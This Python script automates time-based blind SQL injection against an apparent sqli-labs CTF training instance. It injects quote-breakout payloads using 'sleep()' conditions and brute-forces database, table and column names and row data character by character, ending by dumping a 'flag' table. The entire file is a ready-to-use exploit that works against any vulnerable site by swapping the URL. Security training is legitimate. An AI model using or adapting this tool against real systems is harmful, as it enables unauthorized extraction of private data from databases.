import requests as req
from time import sleep
from time import time
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

baseurl = 'http://67ce2a74-778d-4bf4-b0ff-fc208a33b67e.node4.buuoj.cn/Less-10/?id=1'
# less9:'  less10:"
poc = '\"'
sleepTime = 10


def get(url, header=standardHeader):
    res = req.get(url, headers=header)
    sleep(1)
    return res

def checkRes(startTime, endTime):
    if endTime-startTime < sleepTime+1:
        return True
    else:
        return False


def forceDatabases(pocUrl):
    payload = "(select group_concat(schema_name) from information_schema.schemata)"
    print("Forcing database length")
    for databaseConcatLength in range(50,9999):
        startTime = time()
        expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(databaseConcatLength), str(sleepTime))
        # print(expUrl)
        res = get(expUrl)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Database length is {}\nForcing each char".format(databaseConcatLength))
            allDatabases = ''
            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
            for index in range(1,databaseConcatLength+1):
                for char in sqlForce:
                    nowDatabases = allDatabases + char
                    expUrl = pocUrl + payload.format(str(index), nowDatabases, str(sleepTime))
                    startTime = time()
                    res = get(expUrl)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allDatabases = nowDatabases
                        print(allDatabases)
                        break
            return allDatabases


def forceTables(pocUrl, database):
    payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    s = " union select 1,2,{} limit 1,1 -- -"
    print("Forcing all tables' length")
    for tableConcatLength in range(1, 9999):
        startTime = time()
        expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(tableConcatLength), str(sleepTime))
        res = get(expUrl)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(tableConcatLength))
            allTables = ''
            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
            for index in range(1, tableConcatLength + 1):
                for char in sqlForce:
                    nowTables = allTables + char
                    expUrl = pocUrl + payload.format(str(index), nowTables, str(sleepTime))
                    startTime = time()
                    res = get(expUrl)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allTables = nowTables
                        print(allTables)
                        break
            return allTables


def forceColumns(pocUrl, table):
    payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    print("Forcing all columns' length")
    for columnConcatLength in range(1, 9999):
        startTime = time()
        expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(columnConcatLength), str(sleepTime))
        res = get(expUrl)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(columnConcatLength))
            allColumns = ''
            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
            for index in range(1, columnConcatLength + 1):
                for char in sqlForce:
                    nowColumns = allColumns + char
                    expUrl = pocUrl + payload.format(str(index), nowColumns, str(sleepTime))
                    startTime = time()
                    res = get(expUrl)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allColumns = nowColumns
                        print(allColumns)
                        break
            return allColumns


def dumpData(pocUrl, database, table, column='*'):
    payload = "(select {} from {}.{})".format(column, database, table)
    print("Forcing all data's length")
    for dataConcatLength in range(1, 9999):
        startTime = time()
        expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(dataConcatLength), str(sleepTime))
        res = get(expUrl)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(dataConcatLength))
            allData = ''
            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
            for index in range(1, dataConcatLength + 1):
                for char in sqlForce:
                    nowData = allData + char
                    expUrl = pocUrl + payload.format(str(index), nowData, str(sleepTime))
                    startTime = time()
                    res = get(expUrl)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allData = nowData
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    res = get(baseurl)
    position = ''
    databases = forceDatabases(baseurl+poc)
    print('Input a database to force all tables:')
    database = input()
    tables = forceTables(baseurl+poc, database)
    print('Input a table to force all columns:')
    table = input()
    columns = forceColumns(baseurl+poc, table)
    print('Input a column to force all data:')
    dumpColumn = input()
    data = dumpData(baseurl+poc, database='ctftraining', table='flag', column=dumpColumn)
    print(data)

